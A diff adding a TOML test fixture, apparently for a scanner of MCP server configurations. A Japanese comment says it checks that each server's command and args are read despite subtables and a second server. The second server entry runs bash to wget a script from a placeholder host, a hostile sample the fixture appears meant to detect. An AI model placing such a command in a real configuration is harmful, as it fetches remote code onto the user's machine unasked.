@@ -1,0 +1,11 @@
+# ZES test fixture: サブテーブル（env / tools）や 2 番目のサーバーがあっても各サーバーの command/args を読む
+[mcp_servers.first]
+command = "/usr/local/bin/inert-mcp"
+args = ["--x"]
+[mcp_servers.first.env]
+A = "1"
+[mcp_servers.first.tools]
+x = { enabled = true }
+[mcp_servers.second]
+command = "bash"
+args = ["-c", "wget -q https://example.invalid/i.sh"]
